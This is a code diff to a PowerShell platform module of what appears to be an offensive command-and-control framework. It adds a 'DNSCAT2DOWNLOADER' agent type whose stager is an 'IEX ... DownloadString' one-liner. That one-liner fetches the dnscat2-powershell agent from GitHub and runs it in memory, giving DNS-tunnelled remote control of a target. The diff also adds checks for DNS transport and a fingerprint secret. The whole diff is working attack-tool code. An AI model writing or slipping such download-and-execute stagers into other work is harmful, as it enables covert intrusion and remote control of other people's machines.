@@ -60,7 +60,7 @@ class PlatformPowershell(Platform, ModuleBase):
                                     'plattform, or some third party software we support)',
                 'Required'      :   True,
                 'Value'         :   "DEFAULT",
-                'Options'       :   ("DEFAULT", "DNSCAT2")
+                'Options'       :   ("DEFAULT", "DNSCAT2", "DNSCAT2DOWNLOADER")
             },
         }
         self.handler = handler
@@ -177,7 +177,8 @@ class PlatformPowershell(Platform, ModuleBase):
         # do we need STAGECERTIFICATEFILE and is it valid?
         if self.options['STAGED']['Value'] == "TRUE" and (self.options['STAGEENCODING']['Value'] == "TRUE"
                     or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE") \
-                    or self.options['AGENTTYPE']['Value'] == "DNSCAT2":
+                    or self.options['AGENTTYPE']['Value'] == "DNSCAT2" \
+                    or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":
             if not self.options['STAGECERTIFICATEFILE']['Value'] \
                     or self.options['STAGECERTIFICATEFILE']['Value'] == "":
                 print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or " +
@@ -187,7 +188,9 @@ class PlatformPowershell(Platform, ModuleBase):
                     self.options['STAGECERTIFICATEFILE']['Value']):
                 valid = False
 
-        if self.options['AGENTTYPE']['Value'] == "DNSCAT" and self.handler.options['TRANSPORT']['VALUE'] != "DNS":
+        if (self.options['AGENTTYPE']['Value'] == "DNSCAT2" \
+                or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER") \
+                and self.handler.options['TRANSPORT']['Value'] != "DNS":
             print_error("dnscat2 must be used with DNS transport, hence the name!")
             valid = False
 
@@ -264,7 +267,8 @@ class PlatformPowershell(Platform, ModuleBase):
 
         # include fingerprint only if needed for STAGEENCODING and/or STAGEAUTHENTICATION and/or DNSCAT2
         if self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE" \
-                or self.options['AGENTTYPE']['Value'] == "DNSCAT2":  # dnscat2 needs the fingerprint as a secret
+                or self.options['AGENTTYPE']['Value'] == "DNSCAT2" \
+                or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":  # dnscat2 needs the fingerprint as secret
             self._initkeycertificate()
             stager += '$fp="{}";'.format(self.fingerprint)
 
@@ -310,7 +314,7 @@ class PlatformPowershell(Platform, ModuleBase):
         :return: encoded agent bytes
         """
 
-        if self.options['AGENTTYPE']['Value'] == "DNSCAT2":
+        if self.options['AGENTTYPE']['Value'] == "DNSCAT2" or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":
             agent = self.getagent_dnscat2()
 
         elif self.options['AGENTTYPE']['Value'] == "DEFAULT":
@@ -403,13 +407,19 @@ class PlatformPowershell(Platform, ModuleBase):
             return None
 
         # load agent from file dnscat2-powershell
-        f = open(sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2-powershell/dnscat2.ps1"), 'r')
-        agent = f.read()
-        f.close()
+        if self.options['AGENTTYPE']['Value'] == "DNSCAT2":
+            f = open(sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2-powershell/dnscat2.ps1"), 'r')
+            agent = f.read()
+            f.close()
 
-        # or if you do not want to wait for ever for testing, TODO: remove!!!
-        agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/" +\
-                "lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
+        # or if you do not want to wait for ever for testing
+        elif self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":
+            agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/" +\
+                    "lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
+
+        else:
+            print_error("invalid AGENTTYPE: not DNSCAT2 or DNSCAT2DOWNLOADER")
+            return None
 
         zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
         server = self.handler.transport.options['DNSSERVER']['Value']
